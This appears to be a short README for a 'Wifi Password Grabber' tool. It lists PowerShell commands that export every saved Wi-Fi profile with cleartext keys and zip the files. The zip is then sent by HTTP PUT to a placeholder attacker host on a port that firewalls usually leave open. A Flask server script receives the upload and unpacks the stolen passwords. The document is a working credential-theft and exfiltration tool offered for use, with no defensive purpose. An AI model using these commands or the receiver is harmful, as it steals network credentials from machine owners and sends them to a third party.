# Wifi Password Grabber #
#### ↓ PowerShell command to get all saved passwords in the system ↓ ####
`netsh wlan export profile key=clear` 
_**note:**  this will export all wifi networks into `C:\Users\<user>`) directory in .xml format._

#### ↓ PowerShell command to zip all the XML files ↓ ####
`Compress-Archive -U .\*.xml -DestinationPath temp.zip`

#### ↓ PowerShell command to send the zip file via HTTP PUT request ↓ ####
`Invoke-Restmethod -Uri http://[domain, IP or localhost]:[port]/wpg/temp.zip -Method Put -Infile .\temp.zip`
_**note:** use ports that are usually open by default in the firewall, for example, `80`._
### Run this python code as a server ###
This code handles the zip file and extracts `XML` files into the `passwords` folder.
```py
from flask import Flask, request
from zipfile import ZipFile
from os import remove

app = Flask(__name__)

def unzip_all_files():
    with ZipFile('data.zip', 'r') as zipObj:
        zipObj.extractall(path="passwords")
    remove("data.zip")

@app.route("/wpg/<file>", methods=["PUT"])
def data_handler(file):
    with open("data.zip", 'wb') as f:
        for chunk in iter(lambda: request.stream.read(16384), bytes()):
            f.write(chunk)
    unzip_all_files()
    return "done"
    
if __name__ == "__main__":
    app.run(port=80, host="0.0.0.0")
```
#### For localhost: ####
For localhost remove `host="0.0.0.0"`

